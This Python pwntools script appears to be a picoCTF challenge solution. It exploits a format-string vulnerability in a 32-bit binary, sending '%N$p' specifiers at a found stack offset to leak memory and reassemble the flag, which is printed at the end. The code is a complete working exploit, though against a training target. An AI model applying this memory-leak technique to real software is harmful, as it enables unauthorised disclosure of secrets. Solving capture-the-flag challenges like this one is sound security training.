#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

HOST, PORT = "saturn.picoctf.net 51963".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p 

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

def send_payload(payload):
    io = start()
    io.sendlineafter(b">> ", payload)
    io.recvuntil(b"story - \n")
    res = io.recvline()
    io.close()
    return res

# fmt = FmtStr(execute_fmt=send_payload)

# for i in range(200):
    # res = send_payload(b"%" + str(i).encode() + b"$p")
    # log.info(f"trial #{i}: {res}")
    # if b"4141" in res:
        # log.success(f"Got res: {res}, at offset: {i}")
        # break

offset = 36
payload_template = b"%OFF$p"

payload = b""
for i in range(10):
    payload += payload_template.replace(b"OFF", str(i+offset).encode())
    payload += b":"

log.info(f"sending payload: {payload}")
res = send_payload(payload)
values = res.decode().split(":")
flag = ""
for value in values:
    value = value[2:]
    if len(value) != 8:
        break
    ascii_string = bytes.fromhex(value).decode("ASCII")
    flag += ascii_string[::-1]

log.success(f"got flag: {flag}")

# [+] got flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_b840e879}
